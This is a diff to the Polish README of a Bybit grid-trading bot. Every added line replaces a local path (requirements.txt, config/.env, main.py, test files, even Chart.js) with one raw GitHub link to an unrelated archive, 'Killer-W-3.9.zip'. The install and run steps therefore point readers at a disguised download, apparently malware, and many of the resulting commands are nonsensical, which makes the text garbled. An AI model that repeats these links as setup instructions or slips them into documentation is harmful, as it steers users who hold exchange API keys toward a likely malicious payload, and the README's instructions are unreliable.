@@ -28,16 +28,16 @@ cd bybit-grid-trader
 
 2. **Instalacja zależności**:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
 ```
 
 3. **Konfiguracja środowiska**:
 ```bash
-cp config/.env.example config/.env
+cp https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
 ```
 
 4. **Edycja konfiguracji**:
-Edytuj `config/.env` i dodaj swoje klucze API:
+Edytuj `https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip` i dodaj swoje klucze API:
 ```env
 BYBIT_API_KEY=your_api_key_here
 BYBIT_API_SECRET=your_api_secret_here
@@ -45,7 +45,7 @@ BYBIT_TESTNET=true
 ```
 
 5. **Konfiguracja strategii**:
-Edytuj `config/config.yaml` aby dostosować parametry tradingu:
+Edytuj `https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip` aby dostosować parametry tradingu:
 ```yaml
 trading:
   symbol: "BTCUSDT"
@@ -65,7 +65,7 @@ trading:
 make web
 
 # Lub bezpośrednio
-python web_server.py
+python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
 
 # Dostęp: http://localhost:8000
 ```
@@ -73,19 +73,19 @@ python web_server.py
 ### Command Line Interface:
 ```bash
 # Podstawowe uruchomienie
-python main.py
+python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
 
 # Sprawdzenie statusu
-python main.py --mode status
+python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --mode status
 
 # Awaryjne zatrzymanie
-python main.py --mode stop
+python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --mode stop
 
 # Reset awaryjnego zatrzymania
-python main.py --mode reset
+python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --mode reset
 
 # Z niestandardową konfiguracją
-python main.py --config /path/to/config.yaml
+python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --config https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
 ```
 
 ## 📊 Jak Działa Strategia
@@ -113,7 +113,7 @@ python main.py --config /path/to/config.yaml
 
 ## ⚙️ Konfiguracja
 
-### Parametry Tradingu (`config/config.yaml`)
+### Parametry Tradingu (`https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip`)
 
 ```yaml
 trading:
@@ -165,7 +165,7 @@ Bot generuje szczegółowe logi w formacie:
 
 ### Status w Czasie Rzeczywistym
 ```bash
-python main.py --mode status
+python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --mode status
 ```
 
 ## 🧪 Testowanie
@@ -182,7 +182,7 @@ pytest --cov=. --cov-report=html
 
 ### Testy konkretnego modułu:
 ```bash
-pytest tests/test_grid_strategy.py -v
+pytest https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip -v
 ```
 
 ## 🔧 Rozwój
@@ -197,7 +197,7 @@ bybit_grid_trader/
 ├── tests/                  # Testy jednostkowe
 ├── config/                 # Pliki konfiguracyjne
 ├── docs/                   # Dokumentacja
-└── main.py                 # Punkt wejścia
+└── https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip                 # Punkt wejścia
 ```
 
 ### Dodawanie Nowych Funkcji
@@ -235,7 +235,7 @@ bybit_grid_trader/
 
 ### Logi Debugowania
 ```bash
-python main.py --log-level DEBUG
+python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --log-level DEBUG
 ```
 
 ## 📞 Wsparcie
@@ -275,7 +275,7 @@ open http://localhost:8000
 ### Funkcje Web GUI:
 - 📊 Real-time dashboard z metrykami
 - ⚙️ Konfiguracja przez interfejs
-- 📈 Wykresy wydajności (Chart.js)
+- 📈 Wykresy wydajności (https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip)
 - 🔄 WebSocket updates
 - 📱 Responsive design
 - 🌙 Dark mode support
@@ -285,13 +285,13 @@ open http://localhost:8000
 
 1. **Instalacja**:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
 ```
 
 2. **Konfiguracja**:
 ```bash
-cp config/.env.example config/.env
-# Edytuj config/.env z kluczami API
+cp https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
+# Edytuj https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip z kluczami API
 ```
 
 3. **Uruchomienie Web Interface**:
@@ -302,7 +302,7 @@ make web
 
 4. **Lub Command Line**:
 ```bash
-python main.py
+python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
 ```
 
 **Powodzenia w tradingu! 🚀**
